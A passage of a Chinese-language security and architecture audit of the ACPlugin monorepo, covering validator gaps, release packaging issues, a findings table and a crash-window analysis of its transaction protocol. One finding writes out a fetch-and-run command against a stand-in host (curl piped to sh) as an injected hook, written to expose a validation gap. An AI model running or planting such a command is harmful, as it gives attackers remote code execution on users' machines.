- **建议修改位置与最小修复：** `discovery.ts:13` 拆成按 transport 的精确字段集，`:146-180` 按 `auth.type` 使用精确嵌套字段集；required/optional、plain object、未知字段、互斥性全部在建立 Built State 之前完成。
- **是否需要架构决策：** 不需要。
- **测试与 DoD：** JS 与 `as never` 交叉字段、每种 auth 的多余/缺失字段、未知嵌套、非 plain auth 全部失败；官方合法输出与六平台 validator 仍然同构。

---

#### P2-4 — Codex 同样缺少 orphan `.mcp.json` 兜底

- **分类 / 置信度：** Security / **Medium-High**
- **证据：** `packages/platforms/codex/src/validator.ts:1053-1065`
- **当前行为 [EXEC + READ]：** 与 P1-7 完全同源的不对称：hooks 有 `else if (assets.has('hooks/hooks.json'))` 兜底（`:1064-1065`），`mcpServers` 只在 `manifest.mcpServers !== undefined` 时校验（`:1053`）。投递 orphan `.mcp.json`（`url: https://user:pass@…`, `junk:1`）实测 `success=true`、`errors=0`。
- **定级说明：** 定 P2 而非 P1，仅因为**未确认** Codex 自身是否在没有 manifest 字段时自动发现根 `.mcp.json`。校验器的缺口与 Claude Code 完全一致，可利用性取决于 Codex 加载器行为。
- **最小修复：** 镜像 hooks 兜底，与 P1-7 同一行修复。
- **DoD：** 与 P1-7 合并验证。

---

#### P2-5 — 第三方 Contributor 可向 hooks wire 注入任意 shell 命令，最终校验不拦截

- **分类 / 置信度：** Security, Architecture / **High**
- **证据：** 各平台 hook 校验只验证 wire schema 合法性；官方 Contributor 自愿限制为 `node <受管 handler>`，但**没有任何 Platform validator 强制"只能是受管 handler"**
- **当前行为 [EXEC]：** 一个只依赖公开 `/sdk` 的第三方 Extension，占用已声明的 `hooks` extension point，把 `command: "curl -s https://evil.example/x.sh | sh"` 写进 `hooks.json`，在 claude-code、codex、cursor、antigravity 四个平台上**校验全部通过**。
- **诚实定性：** 这**不是 validator 的正确性缺陷**——目标平台自身的 hook schema 就允许任意 command 字符串，因此 validator 与平台协议是同构的（第 G 组问题 7 成立）。但它与系统的隐含承诺冲突：ACPlugin 的整个 capability 模型（owner-scoped Asset、Platform/Extension 无 `dist` 写权限、Execution Host 只运行本 Session 生成的 Asset）暗示"Extension 无法注入任意执行"，而 hook wire 是一个未设防的逃逸口。
- **建议修改位置与最小修复：** 这是威胁模型决策，不是 bug 修复。两个方向：(a) 在各 Platform 的最终校验中要求 hook `command[0] === 'node'` 且 `command[1]` 必须解析为当前 candidate 内的已签发 Asset（OpenCode 的 MCP 校验已经是这个模型，见 `packages/platforms/opencode/src/validator.ts:90-94`，可直接借鉴）；(b) 明确文档化"启用第三方 Extension 等同于信任其执行任意命令"，并在 `llmdoc/architecture/` 记录该边界。
- **是否需要架构决策：** **需要。** 必须明确 Extension 是否属于信任边界之内。
- **测试与 DoD：** 若选 (a)，第三方 fixture 注入非受管 command 在六个平台全部被拒，官方 Contributor 输出全部通过。

---

#### P2-6 — 八个已发布 tarball 的 `devDependencies` 中残留 `@acplugin/core@0.0.1-beta`

- **分类 / 置信度：** Release, Security / **High**
- **证据：** `scripts/verify-release.mjs:381`（字段列表只有 `['dependencies','peerDependencies','optionalDependencies']`）
- **当前行为 [EXEC]：** 对九个包实际执行 `pnpm pack` 并解包后检查 packed manifest，九个中有八个（主包 + 六个 Platform）的 `devDependencies` 含 `"@acplugin/core": "0.0.1-beta"`——一个 `private: true`、**永不发布**的包，`workspace:*` 被改写成了一个不存在的版本号。两个 Extension 包干净。
- **为什么是真实问题：** 不是运行时依赖，因此消费者 `npm install` 不受影响，literal 意义上也没有违反"公开 tarball 运行时依赖不得出现 `@acplugin/*`"。但它 (a) 发布了一个不可解析的 spec 与私有 workspace 拓扑，(b) `@acplugin` 是 npm 上未被占用的 scope，任何人在解包目录里 `npm install` 都会命中依赖混淆面，(c) 与该不变量的**意图**直接冲突。
- **最小复现：** `tar -xzOf tokenroll-acplugin-0.0.2-beta.tgz package/package.json | grep acplugin/core`
- **建议修改位置与最小修复：** `verify-release.mjs:381` 的字段列表加入 `'devDependencies'`；从六个 Platform manifest 删除该 devDependency（已验证它们的 dist 只 import `@tokenroll/acplugin/sdk`，不需要它）；主包如仍需要，通过 `publishConfig` 剥离或改为 workspace-only 的 tsconfig path。
- **是否需要架构决策：** 不需要。
- **测试与 DoD：** 九个 tarball 的四类依赖字段中均无 `@acplugin/*`。

---

#### P2-7 — `^0.0.2-beta` peer 范围排除一切后续主包版本，部分发布必然破坏八个集成

- **分类 / 置信度：** Release / **High**
- **证据：** 八个集成包的 `peerDependencies: { "@tokenroll/acplugin": "workspace:^" }`，pack 后为 `^0.0.2-beta`；`packages/acplugin/src/ecosystem-versions.ts:11` 的 `publicPackageRange()` 同理
- **当前行为 [EXEC]：** `semver.validRange('^0.0.2-beta')` = `>=0.0.2-beta <0.0.3-0`。实测：
  ```
  0.0.2-beta   → true
  0.0.3-beta   → false
  0.0.3        → false
  0.1.0-beta   → false
  1.0.0        → false
  ```
- **为什么是真实故障：** `llmdoc/guides/release.md` 明确允许只发布变更过的包。在 `0.0.x` 下，主包任何一次 bump 都会落在**所有已发布集成**的 peer 范围之外，消费者立即 `ERESOLVE`。这使"九包独立版本化"在 beta 窗口内对主包实际不成立。若 P1-1 的 `1.0.0` 是有意为之则此问题自动消失（`^1.0.0` → `<2.0.0`）；若继续 beta 则是发布阻断项。
- **建议修改位置与最小修复：** beta 窗口内把 peer 改为 `workspace:*` / 显式 `>=` 范围，或规定主包任何发布都必须九包同步 bump。
- **是否需要架构决策：** **需要**，且与 P1-1 的 beta 策略决策是同一个决策。
- **测试与 DoD：** 对"只发布主包"场景做 clean consumer 验证，八个集成仍可解析。

---

#### P2-8 — clean consumer 门禁并未真正覆盖第三方边界

- **分类 / 置信度：** Test, Release / **High**
- **证据：** `scripts/verify-release.mjs:535-558`（第三方 Platform 用 `definePlatform` **内联定义在消费者自己的 `acplugin.config.ts` 里**）、`:566`（`extensions: [hooks(), mcp()]`，仅官方）
- **当前行为 [READ]：** 所谓"第三方 Platform 互操作"验证是在**同一个工程、同一份 `node_modules`、同一个主包实例**中内联定义的。因此未覆盖：
  - ✗ 第三方 **Extension**——`defineExtension` / `isAcpluginExtension` / `resourceRoots` 在整条发布路径上从未被非官方代码调用；
  - ✗ 作为**独立安装包**存在、拥有自己的 `peerDependencies` 与 `node_modules` 条目的第三方集成（即主包重复实例场景）；
  - ✗ `deliveryType: 'workspace' | 'package'` 的第三方 Platform（fixture 只用 `'plugin'`）。
- **为什么是真实问题：** `.changeset/initial-1-0-baseline.md:43` 把"third-party Platform interoperability"列为已验证的发布门禁，实际强度低于该表述。（`llmdoc/guides/release.md:45` 的措辞"through **one** main-package peer instance"更诚实。）
- **附带正面结论 [EXEC]：** 跨 tarball 的 Symbol brand 机制本身是**正确的**——`packages/core/src/kernel-contracts.ts:16,19` 使用 `Symbol.for(...)`，用两份独立 `dist` 副本实测交叉校验双向通过（`same module instance? false` / `A validates B: true` / `B validates A: true`）。若用 unique `Symbol()` 则会失效。
- **建议修改位置与最小修复：** 在 `verifyConsumer` 中物化一个 `file:` 形式的第三方包目录（自带 `package.json` + `peerDependencies: {"@tokenroll/acplugin":"*"}`，一个 `.mjs` + `.d.mts`，只 import `@tokenroll/acplugin/sdk`），同时导出一个 `definePlatform` 工厂和一个 `defineExtension` 工厂，加入消费者的 `dependencies` 与配置。约 40 行，一次覆盖三个缺口。
- **是否需要架构决策：** 不需要。
- **测试与 DoD：** 上述 fixture 在 packed clean consumer 中完成 typecheck + validate + build，并且是 P1-7/P2-3/P2-5 三个对抗性 fixture 的宿主。

---

#### P2-9 — managed-rolldown 的 deterministic 路径审计比 portable-node 窄，可泄漏物理根

- **分类 / 置信度：** Correctness, Security / **High**
- **证据：** `packages/core/src/compiler/managed-auditor.ts:213-219` 对照 `packages/core/src/compiler/portable-auditor.ts:19-25`
- **当前行为 [READ]：** `policy.deterministic: true` 时，managed 只检查输出 code 是否包含**完整的、被打包模块的绝对 ID**；portable 的 `assertNoPhysicalPaths` 则检查 project / work / source / package 全部物理**根**，并同时检查 POSIX separator 变体。因此一个可信 managed 插件只要在 banner/renderChunk 注入 `process.cwd()` 或工程根字符串（不含任何完整模块文件名），就能通过检查并产出机器相关字节。
- **为什么是真实故障：** `deterministic: true` 明确承诺机器物理根不进入输出；该守卫可被正常插件行为绕过，破坏稳定字节与路径脱敏承诺。
- **建议修改位置与最小修复：** 把 portable 的 physical-root 扫描抽为共享内部 helper；managed audit 接收 project/work/source/package 根并检查原始与 POSIX 两种 separator 形式；保留现有完整 module-ID 检查。
- **是否需要架构决策：** 不需要，是同一 deterministic policy 的一致化。
- **测试与 DoD：** managed 插件注入四类根及 separator 变体均失败；`deterministic: false` 不受影响；现有合法 managed job 字节不变。

---

#### P2-10 — Extension build 失败被重复误归因为每个平台的 contribute failure

- **分类 / 置信度：** Correctness / **High**
- **证据：** `packages/core/src/kernel/build-session.ts:150`（`projectHasErrors` 刻意排除带 `extension` 的 error）、`:747-757`、`:773-826`；`packages/core/src/resources/extension-provider.ts:347-349`（缺 Built State 时 throw）
- **当前行为 [READ]：** Extension build 失败记录 `EXTENSION_BUILD_FAILED` 且不进入 `built`。由于 `projectHasErrors()` 排除 extension-owned error，每个平台仍照常进入 contribute 阶段；匹配到 Contributor 却找不到 Built State 后 `throw`，被 `runPlatformStage('contribute')` 捕获，于是 Core 为**每一个**平台再追加一条 `PLATFORM_CONTRIBUTION_FAILED`。
- **为什么是真实故障：** 健康的 Platform 被错误归因，report/inspect 产生重复噪声，并把 compile 阶段的根因扩散到 contribute 阶段，违反精确 phase/owner 契约。整体 failure 结论正确，但诊断不正确。
- **建议修改位置与最小修复：** 在进入 package pipeline 之前计算"被失败 Extension 阻断的平台集合"，跳过其 package 阶段且不归因给 Platform；或让 contribution collection 显式识别 already-failed Extension 并静默停止当前平台，而不是把缺 Built State 当作 Platform throw。**不得**产出缺少该 Extension 的可提交 candidate。
- **是否需要架构决策：** 不需要，owner/phase 规则已明确。
- **测试与 DoD：** Extension build throw + 多个匹配 Contributor；只出现 `EXTENSION_BUILD_FAILED`，无 spurious Platform error；相关平台不产 candidate，其他不依赖该 Extension 的平台仍独立执行。

---

#### P2-11 — MCP `entry` 默认值在三处不一致，且诊断谎称文件不存在

- **分类 / 置信度：** Correctness, Spec / **High**
- **证据：** `packages/extensions/mcp/src/types.ts:57`（TSDoc 写"默认 `./server.ts`"）、`packages/extensions/mcp/src/discovery.ts:110`（解析默认值是 `'server.ts'`）、`:176`（校验默认值又是 `'./server.ts'`）、`:178`（诊断）；`packages/core/src/kernel/path-policy.ts:50-52`（`safeRelativePath` 拒绝一切 `.` segment）
- **当前行为 [READ]：** 三处默认值互不一致。作者若按公开 TSDoc（以及由其生成的 `packages/docs/api/.../StdioMcpServer.md:17`）写 `entry: './server.ts'`，`sources.file()` 会因 `.` segment 被 `safeRelativePath` 拒绝，异常被 `discovery.ts:111-113` 吞掉，`entrySource` 保持 `undefined`，最终报出 `MCP_ENTRY_MISSING: "MCP stdio entry file does not exist."`——**而该文件确实存在**。
- **注意（缩小范围）：** 所有实际代码示例（`packages/docs/extensions/mcp.md:49`、`packages/extensions/mcp/README.md:51`、`packages/playground/src/mcp/local-tools/mcp.ts:6`）都正确使用 `'server.ts'`。因此这不是"文档示例跑不通"，而是"公开类型注释声明的默认值被 API 拒绝 + 诊断内容与事实不符"。
- **建议修改位置与最小修复：** 统一为 `'server.ts'`（改 `types.ts:57` 的 TSDoc 与 `discovery.ts:176`），并把该路径的诊断从 `MCP_ENTRY_MISSING` 改为 `MCP_ENTRY_INVALID` 并说明是路径语法问题；或在 MCP 作者边界显式规范化单个前导 `./`，继续拒绝空、绝对、`..` 与内部 dot。
- **是否需要架构决策：** 不需要。
- **测试与 DoD：** omitted / `server.ts` / `./server.ts` / nested / absolute / empty / `.` / `..` / 反斜杠九种输入；合法形式产出相同字节，非法形式给出准确诊断。

---

#### P2-12 — Hooks 的严格 JSON 快照静默删除嵌套 `undefined`

- **分类 / 置信度：** Correctness, Standards / **High**
- **证据：** `packages/extensions/hooks/src/discovery.ts:117-118`（`if (descriptor.value === undefined) continue;`）；对照 `packages/core/src/kernel/data-boundary.ts:57` 的严格处理
- **当前行为 [READ]：** `copyJson()` 遇到对象 data property 值为 `undefined` 时直接跳过。因此 `{ event: 'SessionStart', typo: undefined }` 在到达"未知字段"schema 校验之前就变成了 `{ event: 'SessionStart' }`，作者的拼写错误被静默接受。
- **为什么是真实故障：** `undefined` 不是 `JsonValue`。一个严格、可审计的数据边界不应把非法输入**改写**成合法输入。同时 Core 与 Hooks 两套快照实现在此发生语义分叉。
- **建议修改位置与最小修复：** `discovery.ts:117-118` 改为对任何嵌套 `undefined` 直接拒绝；顶层可选字段的缺省仍由 `descriptorData` 显式处理。
- **是否需要架构决策：** 行为修复不需要。后续可考虑在 `/sdk` 提供共享的严格不可变 JSON 快照原语，那是一个独立的小型 API 决策。
- **测试与 DoD：** 嵌套/未知 `undefined`、getter、symbol、循环、稀疏/自定义数组、非有限数、`__proto__` 全部失败且 getter 不被执行；合法输入字节不变。

---

#### P2-13 — `troubleshooting.md` 列出四个不存在的诊断码

- **分类 / 置信度：** Correctness, Spec / **High**
- **证据 [EXEC]：** 该文档开篇要求用户"优先使用 `--json` 获取稳定诊断码"，但列表中四个码在源码中不存在。用真实 CLI `validate --json` 复现对照：

  | 文档位置 | 文档写的码 | 实际输出 |
  | --- | --- | --- |
  | `troubleshooting.md:7` | `CONFIG_PLATFORMS_EMPTY` | `CONFIG_PLATFORMS_REQUIRED` |
  | `troubleshooting.md:10` | `CONFIG_LEGACY_TARGETS` | `CONFIG_FIELD_UNKNOWN` |
  | `troubleshooting.md:10` | `CONFIG_LEGACY_MODULES` | `CONFIG_FIELD_UNKNOWN` |
  | `troubleshooting.md:16` | `SOURCE_SYMLINK_UNSUPPORTED` | `RESOURCE_ROOT_CONTENT_INVALID`（`resource-registry.ts:216`） |

  另注：`packages/core/src/kernel/source-registry.ts:271,395` 对作者树 symlink 是 `throw new Error(...)`，不产生结构化诊断，因此 `SOURCE_SYMLINK_UNSUPPORTED` 无论如何都不可能出现在 `--json` 中。
- **最小修复：** 改为上表右列四个真实码。
- **DoD：** 增加一个"文档中出现的诊断码必须在源码中存在"的静态检查。

---

#### P2-14 — `packages/test/vitest.config.ts` 唯独漏了 hooks 的源码 alias

- **分类 / 置信度：** Test / **High**
- **证据：** `packages/test/vitest.config.ts:20-32`
- **当前行为 [READ]：** Core、主包、`/sdk`、六个 Platform、`extension-mcp` 全部 alias 到 workspace 源码，**唯独没有** `@tokenroll/acplugin-extension-hooks`，而 `packages/test/test/hooks.test.ts:9` 与 `extension-api.types.ts:1` 正是从该包 import。结果是 hooks 集成测试跑的是构建产物，其余全部跑源码。
- **为什么是真实问题：** 当前靠 `pretest` 全量构建掩盖。一旦 hooks 的 `dist` 与源码不同步（或因两份 Core 实例导致 brand 不一致），失败现象将极难定位。
- **最小修复：** 补一行 `{ find: '@tokenroll/acplugin-extension-hooks', replacement: workspaceSource('../extensions/hooks/src/index.ts') }`。

---

### P3

| # | Finding | 证据 | 最小修复 |
| --- | --- | --- | --- |
| P3-1 | **`DevSession.current` 的公开语义未定义。** 类型 `packages/core/src/kernel-types.ts:1014` 是整个接口里**唯一没有文档注释**的成员。实现是"最近一次成功"（`dev-session.ts:369`，首轮失败时以失败报告播种），但失败轮的 `build-complete.report` 与随后读到的 `session.current` 会给出相反的 `success`。较旧的 spec 要求失败轮替换 `current`，较新的 remediation spec 要求保留成功值——两份规范互相矛盾。 | `kernel-types.ts:1014`；`dev-session.ts:363-371,447-450` | 补齐 TSDoc 明确为"最近一次成功报告"；若两种状态都需要，改用两个无歧义字段而非一个 getter 兼表两义。**需要一次小型公开 API 决策。** |
| P3-2 | **`Scanner` 是无代码指称的僵尸术语。** `packages/core/src/scanner.ts` 已删除并被 `kernel-v2-architecture.test.ts:130` 断言不存在，Core 源码中无任何 Scanner 标识符，`llmdoc/reference/domain-glossary.md` 也无该词条；真实阶段名是 `DiagnosticPhase = 'discover'`。但全仓仍有 45 处以 Scanner 指代**当前**架构：`kernel-types.ts:472`、六个平台的 `src/components.ts`、`AGENTS.md:94`、`README.md:379` / `README.zh-CN.md:375`、`packages/docs/guide/troubleshooting.md:12`（章节标题"Scanner 失败"，用户按此名去 `--json` 里找 phase 永远找不到）、`project-structure.md:27`、`guide/index.md:7`、`commands-skills-agents.md:3`、`config/public-files.md:36`、`migration/index.ts:84,90,169,1484,1526` 的"Core Scanner"注释。`migration/legacy/scanner/` 与"Legacy Scanner"是合法历史命名，不应改动。 | 同左 | 正常路径统一改为"discover 阶段 / Core 资源发现"，或在 glossary 正式把 Scanner 定义为 discover 阶段别名。当前是两头落空。 |
| P3-3 | **staged whitespace 门禁失败。** `git diff --cached --check` exit 2，三处 `new blank line at EOF`。普通 `git diff --check` 只看 unstaged 故 exit 0。 | `packages/docs/ecosystem/assets-and-documents.md:25`、`packages/docs/ecosystem/build-service.md:28`、`packages/docs/guide/node-runtime.md:46` | 删除三个文件末尾新增空行并重新 stage；不改正文。DoD：两个 `git diff --check` 都 exit 0。 |
| P3-4 | **最外层 `INTERNAL_ERROR` 的 phase 被硬编码为 `package`。** 所有精确 stage 之外的 coordinator 异常统一报 `INTERNAL_ERROR`，但 phase 恒为 `package`，即使错误发生在 setup/discover/compile/cleanup 接缝。 | `packages/core/src/kernel/build-session.ts:968`；phase union `kernel-types.ts:941-945` | 新增明确的 `internal` phase，或由 coordinator 记录并上报当前真实阶段。若新增公开 phase 值，需一次小型 schema 决策。 |
| P3-5 | **`validateCompleteMaterialization` 在提交路径上是重复工作。** `build-session.ts:936-940` 把全部 Unit 写入独立临时根并复核；随后 `commitPackageUnits` 的 `materializePackageUnits` + `validatePackageUnits`（`transaction.ts:536,539`）做的是完全相同的事，且后者才是真正被发布的那份。于是每次 `build` 全量输出被物化三遍（per-unit candidate、aggregate、transaction stage）。以当前 playground 计为 292 文件 / 2.0 MB × 3。它对 `validate`/`inspect`（`commit=false`，不走事务）仍有唯一价值。 | `build-session.ts:936-940` | 将该调用收敛为 `if (!input.commit)`。一行改动。 |
| P3-6 | **`integrationNames` 依赖 JSON 键顺序。** `verify-release.mjs:19` 用 `packages.slice(1)`，隐含假设 `@tokenroll/acplugin` 是 `ecosystem-versions.json` 的第一个键。任何把该 JSON 字母序化的工具（格式化器，或为修 P1-2 而新增的生成器）都会让 `integrationNames` 包含主包而漏掉 antigravity，削弱 `:307,315,336` 的跨集成断言。 | `scripts/verify-release.mjs:17,19` | 改为 `Object.keys(ecosystemVersions).filter(n => n !== '@tokenroll/acplugin')`。**修 P1-2 时必须一并修，否则会被触发。** |
| P3-7 | **transaction marker 的 `scope` 字段被校验但从不参与恢复。** `transaction.ts:135-137` 严格校验 `scope`，但 `:481-509` 的恢复逻辑完全不分支于它。同时 `:469-471` 的 marker 不匹配会抛出且**没有任何自愈路径**——markers 保留在盘上，后续每次构建都以同样错误失败。经推演该状态在正常流程下不可达（两个 marker 由同一 record 写出，恢复期会先删两者），但一旦因手工编辑或异常写入进入，就需人工干预。 | `transaction.ts:135-137,469-471,481-509` | 要么让恢复真正使用 `scope`，要么从 record 中移除它；并为 marker 不匹配定义隔离/自愈策略。 |
| P3-8 | **`.changeset/initial-1-0-baseline.md:15` 版本描述过期**——写的是"the coordinated `0.0.1-beta` cohort"，实际是 `0.0.2-beta` ×8 / `0.0.3-beta` ×1。 | 同左 | 更正文案。 |
| P3-9 | **文档把 brand 称为"private Symbol"**，实际是 `Symbol.for` 的**全局注册**键，可被手工伪造（已实测伪造对象可通过 `isAcpluginPlatform`）。机制本身正确（跨 tarball 必须如此，见 P2-8），但"private"措辞误导——它是 bundle 身份标记，不是完整性凭证（完整形状仍会被复核）。 | `llmdoc/guides/release.md:45` 及中文对照；`packages/core/src/kernel-contracts.ts:16,19,282` | 改述为"共享注册 Symbol brand"。 |
| P3-10 | **codex 被手工 bump 到 `0.0.3-beta` 而其 Changeset 被删除。** `packages/platforms/codex/package.json:3` 为 staged 修改，唯一描述该变更的 `.changeset/calm-tools-name.md` 被 staged 删除。删除本身可辩护（该选项随后被移除），但手工版本号绕过了 changeset 驱动的版本化，且仓库中**不存在任何 `CHANGELOG.md`**，`0.0.3-beta` 将无任何变更记录发布。 | 同左 | 补一份说明性 Changeset，或在发布指南中明确记录该手工 bump。 |
| P3-11 | **两个孤儿空目录与一处不自洽清单。** `packages/platforms/codex/test/golden/skills/command-release/agents`（golden 删除后残留，git 不跟踪空目录故 `git status` 干净）；`packages/platforms/pi/test/golden`（空，且 `pi/test/platform.test.ts` 完全不引用 `goldenRoot`，是六平台中唯一没有 golden 的）。另 `scripts/comment-coverage.json` 收录了 `packages/acplugin/test/sdk-boundary.test.ts` 却未收录同批新增的 `project.test.ts` 与 `dev-session.test.ts`——脚本只对 `src/**` 自动发现，测试文件靠手工登记故不报错。清单本身无 stale 项（195/195 全部存在）。 | 同左 | 删除空目录；补齐或明确不收录测试文件的规则。 |

---

## 4. Architecture Consistency Matrix

评分含义 —— **架构匹配度**：实现与目标架构的一致程度；**实现完整度**：是否覆盖了声明的能力；**复杂度**：相对该子系统真实职责是否相称。

| 子系统 | 架构匹配度 | 实现完整度 | 复杂度是否合理 | 结论 |
| --- | --- | --- | --- | --- |
| **Node Runtime** | ✅ 完全匹配。是 Core Framework Resource 而非 Extension 包（`packages/extensions/node-runtime` 不存在且被测试断言）；owner 固定 `framework:node-runtime`；自动发现 `src/runtime/` 一级文件与显式 `runtime.entries` 互斥且规则清晰；用 Core `portable-node` 编译；每入口只构建一次；不支持的平台只报 `unsupported` 且 `assets: []`；空目录返回 `undefined`（无 Artifact、无兼容性噪声）；固定输出 `runtime/<id>/main.mjs`；不依赖 descriptor / factory / Extension Contributor / Manifest patch | ✅ 完整。扩展名最长匹配、`.d.ts` 排除、kebab ID、NFC/case 冲突检测、executable/module mode 全部实现 | ✅ 合理（247 行 provider + 19 行 paths） | **保留** |
| **Hooks** | ✅ 完全匹配。`bundler.ts`/`adapters.ts` 已删除；只经 Core `portable-node` 编译一次并复用 Built State；作者只返回语义结果，目标 wire 由 Contributor 负责；runner 有 I/O 上限、顶层错误捕获、固定脱敏错误码；`process.env` 只出现在**生成的运行时源码模板**中，构建期不读取 | ⚠️ 一处边界缺陷：严格 JSON 快照静默丢弃嵌套 `undefined`（P2-12） | ✅ 合理 | **局部修复** |
| **MCP** | ✅ 架构匹配（portable intersection、secret 只存 env 名、Contributor 负责 wire、单次编译） | ❌ **三处实质缺陷**：smoke 可被伪造（P1-6）、descriptor 非判别联合（P2-3）、`entry` 默认值三处不一致（P2-11） | ✅ 合理 | **局部修复（优先级最高）** |
| **Platform / Claude Code** | ✅ 匹配 | ⚠️ 808 行深度校验（真实读取并解析 `hooks.json` / `.mcp.json` sidecar 内容），但存在 orphan `.mcp.json` 旁路（**P1-7**） | ✅ 合理 | **局部修复（一行）** |
| **Platform / Codex** | ✅ 匹配 | ⚠️ 1169 行，六平台中最深（强制 url/command 恰选其一、`cwd` 必须为 `"."`、bearer 必须是 env 名）；同一 orphan 缺口（P2-4） | ✅ 合理 | **局部修复（一行）** |
| **Platform / Cursor** | ✅ 匹配 | ✅ **无 orphan 缺口**——Cursor 的 MCP/hooks 只经 manifest 引用加载，校验器读取范围与之同构 | ✅ 合理 | **保留** |
| **Platform / Antigravity** | ✅ 匹配 | ✅ **无 orphan 缺口，且是正确范式**：`validator.ts:160-172` 由"根文件是否存在"驱动校验，而非由 manifest 引用驱动。建议 Claude Code / Codex 直接借鉴 | ✅ 合理 | **保留（作为参考实现）** |
| **Platform / OpenCode** | ✅ 匹配 | ✅ 校验器虽仅 171 行但质量高：按 `type` 精确字段集、未知字段拒绝、local 必须 `["node", <已签发 workspace Asset>]`（阻断任意本地命令）、URL 限 http(s) 且拒绝内联凭据、OAuth 精确字段集。**无 manifest-ref 旁路** | ✅ 合理 | **保留** |
| **Platform / Pi** | ✅ 匹配 | ✅ 不支持的能力正确报告 `unsupported` 而非伪实现——MCP Contributor 只产出 compatibility、零 Asset 零 Document 字段；Hooks 逐事件区分 native/degraded/unsupported | ✅ 合理 | **保留** |
| **Transaction** | ✅ 匹配。`lock → recover → stage → validate → backup → swap → cleanup` 顺序正确 | ⚠️ **崩溃恢复矩阵本身正确**（见 §5 逐窗口推演），但 lock 子协议不是崩溃安全的（**P1-5**），且目录权限未纳入 mode 契约（**P2-1**） | ✅ 合理（633 行承担可恢复整体替换 + subset 保留） | **lock 局部重写 + 其余局部修复** |
| **DevSession** | ✅ 匹配。单一 active round、pending 合并、初始化期补偿轮不发布伪事件、sequence 从 1 开始、close 期间 active round 仍发 complete、`closed` 恰好一次、并发 close 共享 Promise、listener 异常隔离并自动撤销 | ❌ **故障路径完全不收敛**（**P1-3 / P1-4**）；正常路径正确 | ✅ 合理 | **局部修复** |
| **Migration** | ✅ 完全隔离。唯一入口是 `cli.ts:318` 的动态 `import()`，产物中为独立 chunk；Core/Platform/Extension/正常 CLI 均无反向 import；`migration/legacy/**` 六个文件相对 HEAD 零改动，未被机械重写 | ✅ 完整 | ✅ 合理 | **保留** |
| **Docs / Playground** | ⚠️ Playground 边界干净（只 import 公开包，`@acplugin/core` 与深层私有路径命中数为 0），`docs:check` 通过 | ❌ 文档描述了不存在的 CLI 选项（**P1-8**）与四个不存在的诊断码（**P2-13**），并保留僵尸术语（P3-2） | ✅ 合理 | **局部修复** |
| **Release** | ⚠️ tarball 边界本身正确（无 `@acplugin/*` 运行时依赖、`workspace:^` 与 `catalog:` 正确改写、主包不 bundle/re-export 官方集成、跨 tarball brand 有效） | ❌ **发布编排是当前最大风险面**：P1-1、P1-2、P2-6、P2-7、P2-8 五项 | — | **局部修复（但需两个架构决策）** |

---

## 5. Transaction 崩溃窗口逐一推演

用户明确要求"不要默认当前 `.writing → sync → hard-link` 方案正确，请逐个崩溃窗口推演"。以下是独立推演结果。

事务实际序列（`packages/core/src/transaction.ts:462-632`）：

```
acquireLock(wx)
→ recover(读 pending marker / committed marker / backup，按四分支复原)
→ 清理 markers、.writing 草稿、陈旧 stage
→ [subset] 快照未选 Platform
→ mkdtemp(stage) → 物化 preserved + units
→ validate units / preserved / stage 顶层闭包 → 复核 outDir 中的 preserved
→ writeTransactionMarker(pending, hadOutput=exists(outDir))
→ [if exists] rename(outDir → backup)
→ rename(stage → outDir)
→ afterSwap()  ← closeIntegrations
→ writeTransactionMarker(committed)
→ rm backup → rm pending → rm committed
→ finally: rm stage / close lock / rm lock
```

### 崩溃窗口矩阵

| # | 崩溃点 | 磁盘残留状态 | 恢复动作 | 结果 | 判定 |
| --- | --- | --- | --- | --- | --- |
| W1 | pending marker 写完，rename 前 | pending(hadOutput=T)，无 backup，outDir=旧 | pending 分支 → hasBackup=F 且 outDir 存在 → 不动 | 旧输出完好 | ✅ |
| W2 | `rename(outDir→backup)` 后，swap 前 | pending(T)，backup=旧，outDir 缺失，stage 存在 | `rename(backup→outDir)`；stage 按前缀清理 | 旧输出复原 | ✅ |
| W3 | `rename(stage→outDir)` 后，committed 前 | pending(T)，backup=旧，outDir=**新** | `rm outDir`（新）→ `rename(backup→outDir)` | 未提交的新输出被丢弃，旧输出复原 | ✅ **不会暴露未 cleanup 的新输出** |
| W4 | committed marker 写完，`rm backup` 前 | pending+committed，backup=旧，outDir=新 | committed 分支 → outDir 存在 → `rm backup` | 新输出保留，旧 backup 丢弃 | ✅ |
| W5 | `rm backup` 后，`rm pending` 前 | pending+committed，outDir=新 | committed 分支 → 无动作 → 删两个 marker | 新输出保留 | ✅ |
| W6 | `rm pending` 后，`rm committed` 前 | 仅 committed，outDir=新 | committed 分支 → 无动作 → 删 committed | 新输出保留 | ✅ |
| W7 | **首次构建**，pending(F) 写完，swap 前 | pending(hadOutput=F)，无 backup，outDir 缺失 | hadOutput=F 分支 → outDir 不存在 → 不动 | 无残留 | ✅ |
| W8 | **首次构建**，swap 后，committed 前 | pending(F)，无 backup，outDir=新 | hadOutput=F 分支 → `rm outDir` | 未提交的首份输出被移除 | ✅ |
| W9 | `fs.link` 成功后、`rm(.writing)` 前 | 正式 marker + `.writing` 草稿 | 读正式 marker；`:518-519` 清理草稿 | 正确 | ✅ |
| W10 | `.writing` 写完、`fs.link` 前 | 仅 `.writing` 草稿 | 无 marker → 走 backup 分支；草稿被清理 | 正确 | ✅ |
| W11 | `afterSwap`（即 `closeIntegrations`）抛出 | 触发显式 rollback：`rm outDir` + `rename(backup→outDir)`；`:604-612` 清理两个 marker | — | 旧输出复原，无残留 marker | ✅ |
| W12 | rollback 本身失败（AggregateError） | markers 保留（`:604` 判定排除 AggregateError） | 下轮 pending(T)+backup 分支复原 | 可自动恢复 | ✅ **有意设计，正确** |

### 结论

**`.writing → sync → hard-link` 的 marker 发布方案与四分支恢复逻辑在所有 12 个窗口下都正确**：既不会暴露未完成 cleanup 的新输出（W3/W8），也不会错误删除上一份完整输出（W1/W2/W11/W12）。`wx` + hard-link no-replace 保证 marker 永不出现部分 JSON。`hadOutput` 的取值点（`:551`）与其消费点（`:557`）之间没有插入任何状态变更。subset 与 full 的交互也已验证：`normalizeScope` 强制 selected 集合与 Unit Platform 集合精确相等，而失败平台会先触发 `diagnostics.hasErrors` 从而完全跳过提交（`build-session.ts:944`），因此不可达不一致状态。

**真正的缺口不在恢复矩阵，而在其外围**：lock 协议（P1-5）、目录权限（P2-1）、以及未被使用的 `scope` 字段与 marker 不匹配的无自愈路径（P3-7）。

